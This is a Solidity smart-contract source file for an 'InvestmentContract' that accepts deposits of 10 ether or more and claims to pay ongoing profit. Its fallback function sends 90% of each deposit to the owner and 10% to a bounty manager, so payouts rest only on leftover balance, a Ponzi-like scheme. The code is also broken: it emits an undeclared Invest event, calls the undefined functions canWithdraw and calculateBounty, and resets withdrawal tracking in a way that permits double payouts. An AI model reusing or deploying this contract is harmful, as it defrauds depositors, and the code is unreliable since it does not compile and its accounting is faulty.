pragma solidity ^0.4.25;

contract InvestmentContract {
    using SafeMath for uint256;

    mapping(address => uint256) public investments;
    mapping(address => uint256) public lastInvestmentTime;
    mapping(address => uint256) public pendingWithdrawals;
    mapping(address => uint256) public bounties;

    uint256 public minimumInvestment = 10 ether;
    address public owner;
    address public bountyManager;

    event Withdraw(address indexed investor, uint256 amount);
    event Bounty(address indexed hunter, uint256 amount);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor(address _bountyManager) public {
        owner = msg.sender;
        bountyManager = _bountyManager;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    modifier onlyBountyManager() {
        require(msg.sender == bountyManager);
        _;
    }

    function transferOwnership(address newOwner, address newBountyManager) public onlyOwner {
        require(newOwner != address(0));
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        bountyManager = newBountyManager;
    }

    function () external payable {
        require(msg.value >= minimumInvestment);

        if (investments[msg.sender] > 0) {
            if (canWithdraw()) {
                pendingWithdrawals[msg.sender] = 0;
            }
        }

        investments[msg.sender] = investments[msg.sender].add(msg.value);
        lastInvestmentTime[msg.sender] = block.timestamp;

        owner.transfer(msg.value.mul(90).div(100));
        bountyManager.transfer(msg.value.mul(10).div(100));

        emit Invest(msg.sender, msg.value);
    }

    function calculateProfit(address investor) view public returns (uint256) {
        uint256 timeElapsed = now.sub(lastInvestmentTime[investor]).div(1 minutes);
        uint256 profit = investments[investor].mul(33).div(100).mul(timeElapsed).div(72000);
        uint256 totalProfit = profit.sub(pendingWithdrawals[investor]);
        return totalProfit;
    }

    function withdraw() public returns (bool) {
        require(lastInvestmentTime[msg.sender] > 0);

        uint256 profit = calculateProfit(msg.sender);

        if (address(this).balance > profit) {
            if (profit > 0) {
                pendingWithdrawals[msg.sender] = pendingWithdrawals[msg.sender].add(profit);
                msg.sender.transfer(profit);
                emit Withdraw(msg.sender, profit);
            }
            return true;
        } else {
            return false;
        }
    }

    function claimBounty() public {
        uint256 bountyAmount = calculateBounty(msg.sender);

        if (bountyAmount >= minimumInvestment) {
            if (address(this).balance > bountyAmount) {
                bounties[msg.sender] = 0;
                msg.sender.transfer(bountyAmount);
                emit Bounty(msg.sender, bountyAmount);
            }
        }
    }

    function getPendingWithdrawals() public view returns (uint256) {
        return calculateProfit(msg.sender);
    }

    function getPendingBounties(address hunter) public view returns (uint256) {
        return bounties[hunter];
    }

    function getInvestments(address investor) public view returns (uint256) {
        return investments[investor];
    }

    function getBounties(address hunter) public view returns (uint256) {
        return bounties[hunter];
    }

    function addBounty(address hunter, uint256 amount) public onlyBountyManager {
        bounties[hunter] = bounties[hunter].add(amount);
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}